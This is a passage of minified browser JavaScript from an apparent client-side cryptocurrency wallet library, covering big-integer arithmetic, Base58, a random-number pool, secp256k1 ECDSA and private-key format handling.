      for (; o.isEven();) o.rShiftTo(1, o), t ? (r.isEven() && s.isEven() || (r.addTo(this, r), s.subTo(e, s)), r.rShiftTo(1, r)) : s.isEven() || s.subTo(e, s), s.rShiftTo(1, s);
      for (; i.isEven();) i.rShiftTo(1, i), t ? (n.isEven() && a.isEven() || (n.addTo(this, n), a.subTo(e, a)), n.rShiftTo(1, n)) : a.isEven() || a.subTo(e, a), a.rShiftTo(1, a);
      0 <= o.compareTo(i) ? (o.subTo(i, o), t && r.subTo(n, r), s.subTo(a, s)) : (i.subTo(o, i), t && n.subTo(r, n), a.subTo(s, a))
    }
    if (0 != i.compareTo(h.ONE)) return h.ZERO;
    for (; 0 <= a.compareTo(e);) a.subTo(e, a);
    for (; 0 > a.signum();) a.addTo(e, a);
    return a
  }, h.prototype.pow = function(t) {
    return this.exp(t, new v)
  }, h.prototype.gcd = function(e) {
    var r = 0 > this.s ? this.negate() : this.clone(),
      s = 0 > e.s ? e.negate() : e.clone();
    if (0 > r.compareTo(s)) {
      var n = r;
      r = s, s = n
    }
    var t = r.getLowestSetBit(),
      p = s.getLowestSetBit();
    if (0 > p) return r;
    for (p > t && (p = t), 0 < p && (r.rShiftTo(p, r), s.rShiftTo(p, s)); 0 < r.signum();) 0 < (t = r.getLowestSetBit()) && r.rShiftTo(t, r), 0 < (t = s.getLowestSetBit()) && s.rShiftTo(t, s), 0 <= r.compareTo(s) ? (r.subTo(s, r), r.rShiftTo(1, r)) : (s.subTo(r, s), s.rShiftTo(1, s));
    return 0 < p && s.lShiftTo(p, s), s
  }, h.prototype.isProbablePrime = function(e) {
    var t, r = this.abs();
    if (1 == r.t && r[0] <= F[F.length - 1]) {
      for (t = 0; t < F.length; ++t)
        if (r[0] == F[t]) return !0;
      return !1
    }
    if (r.isEven()) return !1;
    for (t = 1; t < F.length;) {
      for (var o = F[t], s = t + 1; s < F.length && T > o;) o *= F[s++];
      for (o = r.modInt(o); s > t;)
        if (0 == o % F[t++]) return !1
    }
    return r.millerRabin(e)
  }, h.prototype.square = function() {
    var e = s();
    return this.squareTo(e), e
  }, h.valueOf = p, h.prototype.toByteArrayUnsigned = function() {
    var e = this.abs().toByteArray();
    return e.length ? (0 == e[0] && (e = e.slice(1)), e.map(function(e) {
      return 0 > e ? e + 256 : e
    })) : e
  }, h.fromByteArrayUnsigned = function(e) {
    return e.length ? new h(128 & e[0] ? [0].concat(e) : e) : e.valueOf(0)
  }, h.prototype.toByteArraySigned = function() {
    var e = this.abs().toByteArrayUnsigned(),
      t = 0 > this.compareTo(h.ZERO);
    return t ? 128 & e[0] ? e.unshift(128) : e[0] |= 128 : 128 & e[0] && e.unshift(0), e
  }, h.fromByteArraySigned = function(e) {
    return 128 & e[0] ? (e[0] &= 127, h.fromByteArrayUnsigned(e).negate()) : h.fromByteArrayUnsigned(e)
  };
  var S = window.Classic = function(e) {
    this.m = e
  };
  S.prototype.convert = function(e) {
    return 0 > e.s || 0 <= e.compareTo(this.m) ? e.mod(this.m) : e
  }, S.prototype.revert = function(e) {
    return e
  }, S.prototype.reduce = function(e) {
    e.divRemTo(this.m, null, e)
  }, S.prototype.mulTo = function(e, t, o) {
    e.multiplyTo(t, o), this.reduce(o)
  }, S.prototype.sqrTo = function(e, t) {
    e.squareTo(t), this.reduce(t)
  };
  var A = window.Montgomery = function(e) {
    this.m = e, this.mp = e.invDigit(), this.mpl = 32767 & this.mp, this.mph = this.mp >> 15, this.um = (1 << e.DB - 15) - 1, this.mt2 = 2 * e.t
  };
  A.prototype.convert = function(e) {
    var t = s();
    return e.abs().dlShiftTo(this.m.t, t), t.divRemTo(this.m, null, t), 0 > e.s && 0 < t.compareTo(h.ZERO) && this.m.subTo(t, t), t
  }, A.prototype.revert = function(e) {
    var t = s();
    return e.copyTo(t), this.reduce(t), t
  }, A.prototype.reduce = function(e) {
    for (; e.t <= this.mt2;) e[e.t++] = 0;
    for (var t = 0; t < this.m.t; ++t) {
      var o = 32767 & e[t],
        r = o * this.mpl + ((o * this.mph + (e[t] >> 15) * this.mpl & this.um) << 15) & e.DM;
      for (o = t + this.m.t, e[o] += this.m.am(0, r, e, t, 0, this.m.t); e[o] >= e.DV;) e[o] -= e.DV, e[++o]++
    }
    e.clamp(), e.drShiftTo(this.m.t, e), 0 <= e.compareTo(this.m) && e.subTo(this.m, e)
  }, A.prototype.mulTo = function(e, t, o) {
    e.multiplyTo(t, o), this.reduce(o)
  }, A.prototype.sqrTo = function(e, t) {
    e.squareTo(t), this.reduce(t)
  };
  var v = window.NullExp = function() {};
  v.prototype.convert = function(e) {
    return e
  }, v.prototype.revert = function(e) {
    return e
  }, v.prototype.mulTo = function(e, t, o) {
    e.multiplyTo(t, o)
  }, v.prototype.sqrTo = function(e, t) {
    e.squareTo(t)
  };
  var E = window.Barrett = function(e) {
    this.r2 = s(), this.q3 = s(), h.ONE.dlShiftTo(2 * e.t, this.r2), this.mu = this.r2.divide(e), this.m = e
  };
  E.prototype.convert = function(e) {
    if (0 > e.s || e.t > 2 * this.m.t) return e.mod(this.m);
    if (0 > e.compareTo(this.m)) return e;
    var t = s();
    return e.copyTo(t), this.reduce(t), t
  }, E.prototype.revert = function(e) {
    return e
  }, E.prototype.reduce = function(e) {
    for (e.drShiftTo(this.m.t - 1, this.r2), e.t > this.m.t + 1 && (e.t = this.m.t + 1, e.clamp()), this.mu.multiplyUpperTo(this.r2, this.m.t + 1, this.q3), this.m.multiplyLowerTo(this.q3, this.m.t + 1, this.r2); 0 > e.compareTo(this.r2);) e.dAddOffset(1, this.m.t + 1);
    for (e.subTo(this.r2, e); 0 <= e.compareTo(this.m);) e.subTo(this.m, e)
  }, E.prototype.mulTo = function(e, t, o) {
    e.multiplyTo(t, o), this.reduce(o)
  }, E.prototype.sqrTo = function(e, t) {
    e.squareTo(t), this.reduce(t)
  }
}(),
function() {}("object" == typeof module ? module.exports : window.Cafbl = {}),
function(e) {
  e.Base58 = {
    alphabet: "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz",
    validRegex: /^[1-9A-HJ-NP-Za-km-z]+$/,
    base: BigInteger.valueOf(58),
    encode: function(e) {
      for (var o, r = BigInteger.fromByteArrayUnsigned(e), s = []; 0 <= r.compareTo(t.base);) o = r.mod(t.base), s.unshift(t.alphabet[o.intValue()]), r = r.subtract(o).divide(t.base);
      s.unshift(t.alphabet[r.intValue()]);
      for (var n = 0; n < e.length && 0 == e[n]; n++) s.unshift(t.alphabet[0]);
      return s.join("")
    },
    decode: function(e) {
      for (var o, r = BigInteger.valueOf(0), s = 0, n = e.length - 1; 0 <= n; n--) {
        if (o = t.alphabet.indexOf(e[n]), 0 > o) throw "Invalid character";
        r = r.add(BigInteger.valueOf(o).multiply(t.base.pow(e.length - 1 - n))), "1" == e[n] ? s++ : s = 0
      }
      for (var p = r.toByteArrayUnsigned(); 0 < s--;) p.unshift(0);
      return p
    }
  };
  var t = e.Base58}("undefined" == typeof Cafbl ? module.exports : Cafbl),
function() {
  var e = window.SecureRandom = function() {};
  if (e.state, e.pool, e.pptr, e.poolCopyOnInit, e.poolSize = 256, e.prototype.nextBytes = function(t) {
      var o;
      if (window.crypto && window.crypto.getRandomValues && window.Uint8Array) try {
        var r = new Uint8Array(t.length);
        for (window.crypto.getRandomValues(r), o = 0; o < t.length; ++o) t[o] = e.getByte() ^ r[o];
        return
      } catch (e) {
        alert(e)
      }
      for (o = 0; o < t.length; ++o) t[o] = e.getByte()
    }, e.seedTime = function() {
      e.seedInt(new Date().getTime())
    }, e.getByte = function() {
      if (null == e.state) {
        for (e.seedTime(), e.state = e.ArcFour(), e.state.init(e.pool), e.poolCopyOnInit = [], e.pptr = 0; e.pptr < e.pool.length; ++e.pptr) e.poolCopyOnInit[e.pptr] = e.pool[e.pptr];
        e.pptr = 0
      }
      return e.state.next()
    }, e.seedInt = function(t) {
      e.seedInt8(t), e.seedInt8(t >> 8), e.seedInt8(t >> 16), e.seedInt8(t >> 24)
    }, e.seedInt16 = function(t) {
      e.seedInt8(t), e.seedInt8(t >> 8)
    }, e.seedInt8 = function(t) {
      e.pool[e.pptr++] ^= 255 & t, e.pptr >= e.poolSize && (e.pptr -= e.poolSize)
    }, e.ArcFour = function() {
      function e() {
        this.i = 0, this.j = 0, this.S = []
      }

      function t(e) {
        var o, r, s;
        for (o = 0; 256 > o; ++o) this.S[o] = o;
        for (r = 0, o = 0; 256 > o; ++o) r = 255 & r + this.S[o] + e[o % e.length], s = this.S[o], this.S[o] = this.S[r], this.S[r] = s;
        this.i = 0, this.j = 0
      }

      function o() {
        var e;
        return this.i = 255 & this.i + 1, this.j = 255 & this.j + this.S[this.i], e = this.S[this.i], this.S[this.i] = this.S[this.j], this.S[this.j] = e, this.S[255 & e + this.S[this.i]]
      }
      return e.prototype.init = t, e.prototype.next = o, new e
    }, null == e.pool) {
    e.pool = [], e.pptr = 0;
    var o;
    if (window.crypto && window.crypto.getRandomValues && window.Uint8Array) try {
      var r = new Uint8Array(e.poolSize);
      for (window.crypto.getRandomValues(r), o = 0; o < e.poolSize; ++o) e.pool[e.pptr++] = r[o]
    } catch (e) {
      alert(e)
    }
    for (; e.pptr < e.poolSize;) o = Math.floor(65536 * Math.random()), e.pool[e.pptr++] = o >>> 8, e.pool[e.pptr++] = 255 & o;
    e.pptr = Math.floor(e.poolSize * Math.random()), e.seedTime();
    var s = "";
    s += window.screen.height * window.screen.width * window.screen.colorDepth, s += window.screen.availHeight * window.screen.availWidth * window.screen.pixelDepth;
    var n = new Date,
      p = n.getTimezoneOffset();
    s += p, s += navigator.userAgent;
    for (var a = "", d = 0; d < navigator.plugins.length; d++) a += navigator.plugins[d].name + " " + navigator.plugins[d].filename + " " + navigator.plugins[d].description + " " + navigator.plugins[d].version + ", ";
    for (var l = "", d = 0; d < navigator.mimeTypes.length; d++) l += navigator.mimeTypes[d].description + " " + navigator.mimeTypes[d].type + " " + navigator.mimeTypes[d].suffixes + ", ";
    s += a + l, s += navigator.cookieEnabled + typeof sessionStorage + typeof localStorage, s += navigator.language, s += window.history.length, s += window.location;
    for (var u = Crypto.SHA256(s, {
        asBytes: !0
      }), d = 0; d < u.length; d++) e.seedInt8(u[d])
  }}(),
Cafbl.Address = function(e) {
    "string" == typeof e && (e = Cafbl.Address.decodeString(e)), this.hash = e, this.version = Cafbl.Address.networkVersion},
Cafbl.Address.networkVersion = 0, Cafbl.Address.prototype.toString = function() {
    var e = this.hash.slice(0);
    e.unshift(this.version);
    var t = Crypto.SHA256(Crypto.SHA256(e, {
        asBytes: !0
      }), {
        asBytes: !0
      }),
      o = e.concat(t.slice(0, 4));
    return Cafbl.Base58.encode(o)},
Cafbl.Address.prototype.getHashBase64 = function() {
    return Crypto.util.bytesToBase64(this.hash)},
Cafbl.Address.decodeString = function(e) {
    var t = Cafbl.Base58.decode(e),
      o = t.slice(0, 21),
      i = Crypto.SHA256(Crypto.SHA256(o, {
        asBytes: !0
      }), {
        asBytes: !0
      });
    if (i[0] != t[21] || i[1] != t[22] || i[2] != t[23] || i[3] != t[24]) throw "Checksum validation failed!";
    var r = o.shift();
    if (0 != r) throw "Version " + r + " not supported!";
    return o},
Cafbl.ECDSA = function() {
    function t(e, t, o, r) {
      for (var s = Math.max(t.bitLength(), r.bitLength()), n = e.add2D(o), p = e.curve.getInfinity(), a = s - 1; 0 <= a; --a) p = p.twice2D(), p.z = BigInteger.ONE, t.testBit(a) ? p = p.add2D(r.testBit(a) ? n : e) : r.testBit(a) && (p = p.add2D(o));
      return p
    }
    var l = EllipticCurve.getSECCurveByName("secp256k1"),
      e = new SecureRandom,
      o = null,
      u = {
        getBigRandom: function(t) {
          return new BigInteger(t.bitLength(), e).mod(t.subtract(BigInteger.ONE)).add(BigInteger.ONE)
        },
        sign: function(t, o) {
          var i = l.getN(),
            n = BigInteger.fromByteArrayUnsigned(t);
          do var e = u.getBigRandom(i),
            p = l.getG(),
            a = p.multiply(e),
            d = a.getX().toBigInteger().mod(i); while (0 >= d.compareTo(BigInteger.ZERO));
          var r = e.modInverse(i).multiply(n.add(o.multiply(d))).mod(i);
          return u.serializeSig(d, r)
        },
        verify: function(t, o, i) {
          var n, p;
          if (Cafbl.Util.isArray(o)) {
            var a = u.parseSig(o);
            n = a.r, p = a.s
          } else {
            if ("object" != typeof o || !o.r || !o.s) throw "Invalid value for signature";
            n = o.r, p = o.s
          }
          var d;
          if (i instanceof ec.PointFp) d = i;
          else {
            if (!Cafbl.Util.isArray(i)) throw "Invalid format for pubkey value, must be byte array or ec.PointFp";
            d = EllipticCurve.PointFp.decodeFrom(l.getCurve(), i)
          }
          var y = BigInteger.fromByteArrayUnsigned(t);
          return u.verifyRaw(y, n, p, d)
        },
        verifyRaw: function(t, e, i, r) {
          var o = l.getN(),
            s = l.getG();
          if (0 > e.compareTo(BigInteger.ONE) || 0 <= e.compareTo(o)) return !1;
          if (0 > i.compareTo(BigInteger.ONE) || 0 <= i.compareTo(o)) return !1;
          var n = i.modInverse(o),
            p = t.multiply(n).mod(o),
            a = e.multiply(n).mod(o),
            d = s.multiply(p).add(r.multiply(a)),
            u = d.getX().toBigInteger().mod(o);
          return u.equals(e)
        },
        serializeSig: function(e, t) {
          var i = e.toByteArraySigned(),
            o = t.toByteArraySigned(),
            r = [];
          return r.push(2), r.push(i.length), r = r.concat(i), r.push(2), r.push(o.length), r = r.concat(o), r.unshift(r.length), r.unshift(48), r
        },
        parseSig: function(e) {
          var t;
          if (48 != e[0]) throw new Error("Signature not a valid DERSequence");
          if (t = 2, 2 != e[t]) throw new Error("First element in signature must be a DERInteger");
          var o = e.slice(t + 2, t + 2 + e[t + 1]);
          if (t += 2 + e[t + 1], 2 != e[t]) throw new Error("Second element in signature must be a DERInteger");
          var i = e.slice(t + 2, t + 2 + e[t + 1]);
          t += 2 + e[t + 1];
          var n = BigInteger.fromByteArrayUnsigned(o),
            r = BigInteger.fromByteArrayUnsigned(i);
          return {
            r: n,
            s: r
          }
        },
        parseSigCompact: function(e) {
          if (65 !== e.length) throw "Signature has the wrong length";
          var t = e[0] - 27;
          if (0 > t || 7 < t) throw "Invalid signature type";
          var o = l.getN(),
            i = BigInteger.fromByteArrayUnsigned(e.slice(1, 33)).mod(o),
            r = BigInteger.fromByteArrayUnsigned(e.slice(33, 65)).mod(o);
          return {
            r: i,
            s: r,
            i: t
          }
        },
        recoverPubKey: function(d, r, s, y) {
          y = 3 & y;
          var c = 1 & y,
            m = y >> 1,
            g = l.getN(),
            n = l.getG(),
            f = l.getCurve(),
            h = f.getQ(),
            p = f.getA().toBigInteger(),
            a = f.getB().toBigInteger();
          o || (o = h.add(BigInteger.ONE).divide(BigInteger.valueOf(4)));
          var b = m ? d.add(g) : d,
            B = b.multiply(b).multiply(b).add(p.multiply(b)).add(a).mod(h),
            F = B.modPow(o, h),
            T = (F.isEven() ? y % 2 : (y + 1) % 2, (F.isEven() ? !c : c) ? F : h.subtract(F)),
            v = new EllipticCurve.PointFp(f, f.fromBigInteger(b), f.fromBigInteger(T));
          v.validate();
          var S = BigInteger.fromByteArrayUnsigned(s),
            e = BigInteger.ZERO.subtract(S).mod(g),
            C = d.modInverse(g),
            A = t(v, r, n, e).multiply(C);
          if (A.validate(), !u.verifyRaw(S, d, r, A)) throw "Pubkey recovery unsuccessful";
          var E = new Cafbl.ECKey;
          return E.pub = A, E
        },
        calcPubkeyRecoveryParam: function(e, t, o, r) {
          for (var s = 0; 4 > s; s++) try {
            var n = Cafbl.ECDSA.recoverPubKey(t, o, r, s);
            if (n.getCafblAddress().toString() == e) return s
          } catch (e) {}
          throw "Unable to find valid recovery factor"
        }
      };
    return u}(),
Cafbl.KeyPool = function() {
    return new function() {
      return this.keyArray = [], this.push = function(e) {
        if (null != e && null != e.priv) {
          var t = !0;
          for (var o in this.keyArray) {
            var i = this.keyArray[o];
            if (null != i && null != i.priv && e.getCafblAddress() == i.getCafblAddress()) {
              t = !1;
              break
            }
          }
          t && this.keyArray.push(e)
        }
      }, this.reset = function() {
        this.keyArray = []
      }, this.getArray = function() {
        return this.keyArray.slice(0)
      }, this.setArray = function(e) {
        this.keyArray = e
      }, this.length = function() {
        return this.keyArray.length
      }, this.toString = function() {
        var e = "# = " + this.length() + "\n",
          t = this.getArray();
        for (var i in t) {
          var r = t[i];
          Cafbl.Util.hasMethods(r, "getCafblAddress", "toString") && null != r && (e += "\"" + r.getCafblAddress() + "\", \"" + r.toString("wif") + "\"\n")
        }
        return e
      }, this
    }}(),
Cafbl.Bip38Key = function() {
    var e = function(e, t) {
      this.address = e, this.priv = t
    };
    return e.prototype.getCafblAddress = function() {
      return this.address
    }, e.prototype.toString = function() {
      return this.priv
    }, e}(),
Cafbl.ECKey = function() {
    var e = Cafbl.ECDSA,
      t = Cafbl.KeyPool,
      i = EllipticCurve.getSECCurveByName("secp256k1"),
      r = function(o) {
        if (!o) {
          var s = i.getN();
          this.priv = e.getBigRandom(s)
        } else if (o instanceof BigInteger) this.priv = o;
        else if (Cafbl.Util.isArray(o)) this.priv = BigInteger.fromByteArrayUnsigned(o);
        else if ("string" == typeof o) {
          var n = null;
          try {
            r.isWalletImportFormat(o) ? n = r.decodeWalletImportFormat(o) : r.isCompressedWalletImportFormat(o) ? (n = r.decodeCompressedWalletImportFormat(o), this.compressed = !0) : r.isMiniFormat(o) ? n = Crypto.SHA256(o, {
              asBytes: !0
            }) : r.isHexFormat(o) ? n = Crypto.util.hexToBytes(o) : r.isBase64Format(o) && (n = Crypto.util.base64ToBytes(o))
          } catch (e) {
            this.setError(e)
          }
          this.priv = r.isBase6Format(o) ? new BigInteger(o, 6) : null == n || 32 != n.length ? null : BigInteger.fromByteArrayUnsigned(n)
        }
        this.compressed = null == this.compressed ? !!r.compressByDefault : this.compressed;
        try {
          null != this.priv && 0 == BigInteger.ZERO.compareTo(this.priv) && this.setError("Error: BigInteger equal to zero.");
          var p = Crypto.util.hexToBytes("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364140"),
            a = BigInteger.fromByteArrayUnsigned(p);
          null != this.priv && 0 > a.compareTo(this.priv) && this.setError("Error: BigInteger outside of curve range."), null != this.priv && t.push(this)
        } catch (e) {
          this.setError(e)
        }
      };
    return r.privateKeyPrefix = 128, r.compressByDefault = !1, r.prototype.setError = function(e) {
      return this.error = e, this.priv = null, this
    }, r.prototype.setCompressed = function(e) {
      return this.compressed = !!e, this.pubPoint && (this.pubPoint.compressed = this.compressed), this
    }, r.prototype.getPub = function() {
      return this.compressed ? this.pubComp ? this.pubComp : this.pubComp = this.getPubPoint().getEncoded(1) : this.pubUncomp ? this.pubUncomp : this.pubUncomp = this.getPubPoint().getEncoded(0)
    }, r.prototype.getPubPoint = function() {
      return this.pubPoint || (this.pubPoint = i.getG().multiply(this.priv), this.pubPoint.compressed = this.compressed), this.pubPoint
    }, r.prototype.getPubKeyHex = function() {
      return this.compressed ? this.pubKeyHexComp ? this.pubKeyHexComp : this.pubKeyHexComp = Crypto.util.bytesToHex(this.getPub()).toString().toUpperCase() : this.pubKeyHexUncomp ? this.pubKeyHexUncomp : this.pubKeyHexUncomp = Crypto.util.bytesToHex(this.getPub()).toString().toUpperCase()
    }, r.prototype.getPubKeyHash = function() {
      return this.compressed ? this.pubKeyHashComp ? this.pubKeyHashComp : this.pubKeyHashComp = Cafbl.Util.sha256ripe160(this.getPub()) : this.pubKeyHashUncomp ? this.pubKeyHashUncomp : this.pubKeyHashUncomp = Cafbl.Util.sha256ripe160(this.getPub())
    }, r.prototype.getCafblAddress = function() {
      var e = this.getPubKeyHash(),
        t = new Cafbl.Address(e);
      return t.toString()
    }, r.prototype.setPub = function(e) {
      Cafbl.Util.isArray(e) && (e = Crypto.util.bytesToHex(e).toString().toUpperCase());
      var t = i.getCurve().decodePointHex(e);
      return this.setCompressed(t.compressed), this.pubPoint = t, this
    }, r.prototype.getCafblWalletImportFormat = function() {
      var e = this.getCafblPrivateKeyByteArray();
      if (null == e) return "";
      e.unshift(r.privateKeyPrefix), this.compressed && e.push(1);
      var t = Crypto.SHA256(Crypto.SHA256(e, {
        asBytes: !0
      }), {
        asBytes: !0
      });
      e = e.concat(t.slice(0, 4));
      var i = Cafbl.Base58.encode(e);
      return i
    }, r.prototype.getCafblHexFormat = function() {
      return Crypto.util.bytesToHex(this.getCafblPrivateKeyByteArray()).toString().toUpperCase()
    }, r.prototype.getCafblBase64Format = function() {
      return Crypto.util.bytesToBase64(this.getCafblPrivateKeyByteArray())
    }, r.prototype.getCafblPrivateKeyByteArray = function() {
      if (null == this.priv) return null;
      for (var e = this.priv.toByteArrayUnsigned(); 32 > e.length;) e.unshift(0);
      return e
    }, r.prototype.toString = function(e) {
      return e = e || "", "base64" == e.toString().toLowerCase() || "b64" == e.toString().toLowerCase() ? this.getCafblBase64Format() : "wif" == e.toString().toLowerCase() ? this.getCafblWalletImportFormat() : this.getCafblHexFormat()
    }, r.prototype.sign = function(t) {
      return e.sign(t, this.priv)
    }, r.prototype.verify = function(t, o) {
      return e.verify(t, o, this.getPub())
    }, r.decodeWalletImportFormat = function(e) {
      var t = Cafbl.Base58.decode(e),
        o = t.slice(0, 33),
        i = Crypto.SHA256(Crypto.SHA256(o, {
          asBytes: !0
        }), {
          asBytes: !0
        });
      if (i[0] != t[33] || i[1] != t[34] || i[2] != t[35] || i[3] != t[36]) throw "Checksum validation failed!";
      var s = o.shift();
      if (s != r.privateKeyPrefix) throw "Version " + s + " not supported!";
      return o
    }, r.decodeCompressedWalletImportFormat = function(e) {
      var t = Cafbl.Base58.decode(e),
        o = t.slice(0, 34),
        i = Crypto.SHA256(Crypto.SHA256(o, {
          asBytes: !0
        }), {
          asBytes: !0
        });
      if (i[0] != t[34] || i[1] != t[35] || i[2] != t[36] || i[3] != t[37]) throw "Checksum validation failed!";
      var s = o.shift();
      if (s != r.privateKeyPrefix) throw "Version " + s + " not supported!";
      return o.pop(), o
    }, r.isHexFormat = function(e) {
      return e = e.toString(), /^[A-Fa-f0-9]{64}$/.test(e)
    }, r.isWalletImportFormat = function(e) {
      return e = e.toString(), 128 == r.privateKeyPrefix ? /^5[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{50}$/.test(e) : /^9[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{50}$/.test(e)
    }, r.isCompressedWalletImportFormat = function(e) {
      return e = e.toString(), 128 == r.privateKeyPrefix ? /^[LK][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{51}$/.test(e) : /^c[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{51}$/.test(e)
    }, r.isBase64Format = function(e) {
      return e = e.toString(), /^[ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789=+\/]{44}$/.test(e)
    }, r.isBase6Format = function(e) {
      return e = e.toString(), /^[012345]{99}$/.test(e)
    }, r.isMiniFormat = function(e) {
      e = e.toString();
      var t = /^S[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{21}$/.test(e),
        i = /^S[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{25}$/.test(e),
        r = /^S[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{29}$/.test(e),
        s = Crypto.SHA256(e + "?", {
          asBytes: !0
        });
      return (0 === s[0] || 1 === s[0]) && (t || i || r)
    }, r}(),
Cafbl.Util = {
    isArray: Array.isArray || function(e) {
      return "[object Array]" === Object.prototype.toString.call(e)
    },
    makeFilledArray: function(e, t) {
      for (var o = [], r = 0; e > r;) o[r++] = t;
      return o
    },
    numToVarInt: function(e) {
      return 253 > e ? [e] : 65536 >= e ? [253, e >>> 8, 255 & e] : 1 >= e ? [254].concat(Crypto.util.wordsToBytes([e])) : [255].concat(Crypto.util.wordsToBytes([e >>> 32, e]))
    },
    valueToBigInt: function(e) {
      return e instanceof BigInteger ? e : BigInteger.fromByteArrayUnsigned(e)
    },
    formatValue: function(e) {
      for (var t = this.valueToBigInt(e).toString(), o = 8 < t.length ? t.substr(0, t.length - 8) : "0", i = 8 < t.length ? t.substr(t.length - 8) : t; 8 > i.length;) i = "0" + i;
      for (i = i.replace(/0*$/, ""); 2 > i.length;) i += "0";
      return o + "." + i
    },
    parseValue: function(e) {
      for (var t = e.split("."), o = t[0], i = t[1] || "0"; 8 > i.length;) i += "0";
      i = i.replace(/^0+/g, "");
      var r = BigInteger.valueOf(parseInt(o));
      return r = r.multiply(BigInteger.valueOf(1e8)), r = r.add(BigInteger.valueOf(parseInt(i)))
    },
    sha256ripe160: function(e) {
      return Crypto.RIPEMD160(Crypto.SHA256(e, {
        asBytes: !0
      }), {
        asBytes: !0
      })
    },
    dsha256: function(e) {
      return Crypto.SHA256(Crypto.SHA256(e, {
        asBytes: !0
      }), {
        asBytes: !0
      })
    },
    hasMethods: function(e) {
      for (var t, o = 1; t = arguments[o++];)
        if ("function" != typeof e[t]) return !1;
      return !0
    }
  },
function() {
    var e = null;
    window.Crypto_scrypt = function(t, o, s, n, r, p, a) {
      function l() {
        function e(e, s, n, r, p, a) {
          var d, u = 128 * n;
          for (m(e, s, a, 0, u), d = 0; r > d; d++) m(a, 0, p, d * u, u), t(a, 0, u, n);
          for (d = 0; r > d; d++) {
            var y = o(a, 0, n) & r - 1;
            l(p, y * u, a, 0, u), t(a, 0, u, n)
          }
          m(a, 0, e, s, u)
        }

        function t(e, t, o, s) {
          var r, n = [];
          for (m(e, t + 64 * (2 * s - 1), n, 0, 64), r = 0; 2 * s > r; r++) l(e, 64 * r, n, 0, 64), a(n), m(n, 0, e, o + 64 * r, 64);
          for (r = 0; s > r; r++) m(e, o + 64 * (2 * r), e, t + 64 * r, 64);
          for (r = 0; s > r; r++) m(e, o + 64 * (2 * r + 1), e, t + 64 * (r + s), 64)
        }

        function p(e, t) {
          return e << t | e >>> 32 - t
        }

        function a(e) {
          var t, r = Array(32),
            o = Array(32);
          for (t = 0; 16 > t; t++) r[t] = (255 & e[4 * t + 0]) << 0, r[t] |= (255 & e[4 * t + 1]) << 8, r[t] |= (255 & e[4 * t + 2]) << 16, r[t] |= (255 & e[4 * t + 3]) << 24;
          for (d(r, 0, o, 0, 16), t = 8; 0 < t; t -= 2) o[4] ^= p(o[0] + o[12], 7), o[8] ^= p(o[4] + o[0], 9), o[12] ^= p(o[8] + o[4], 13), o[0] ^= p(o[12] + o[8], 18), o[9] ^= p(o[5] + o[1], 7), o[13] ^= p(o[9] + o[5], 9), o[1] ^= p(o[13] + o[9], 13), o[5] ^= p(o[1] + o[13], 18), o[14] ^= p(o[10] + o[6], 7), o[2] ^= p(o[14] + o[10], 9), o[6] ^= p(o[2] + o[14], 13), o[10] ^= p(o[6] + o[2], 18), o[3] ^= p(o[15] + o[11], 7), o[7] ^= p(o[3] + o[15], 9), o[11] ^= p(o[7] + o[3], 13), o[15] ^= p(o[11] + o[7], 18), o[1] ^= p(o[0] + o[3], 7), o[2] ^= p(o[1] + o[0], 9), o[3] ^= p(o[2] + o[1], 13), o[0] ^= p(o[3] + o[2], 18), o[6] ^= p(o[5] + o[4], 7), o[7] ^= p(o[6] + o[5], 9), o[4] ^= p(o[7] + o[6], 13), o[5] ^= p(o[4] + o[7], 18), o[11] ^= p(o[10] + o[9], 7), o[8] ^= p(o[11] + o[10], 9), o[9] ^= p(o[8] + o[11], 13), o[10] ^= p(o[9] + o[8], 18), o[12] ^= p(o[15] + o[14], 7), o[13] ^= p(o[12] + o[15], 9), o[14] ^= p(o[13] + o[12], 13), o[15] ^= p(o[14] + o[13], 18);
          for (t = 0; 16 > t; ++t) r[t] = o[t] + r[t];
          for (t = 0; 16 > t; t++) {
            var s = 4 * t;
            e[s + 0] = 255 & r[t] >> 0, e[s + 1] = 255 & r[t] >> 8, e[s + 2] = 255 & r[t] >> 16, e[s + 3] = 255 & r[t] >> 24
          }
        }

        function l(e, t, o, r, s) {
          for (var n = s >> 6; n--;) o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], 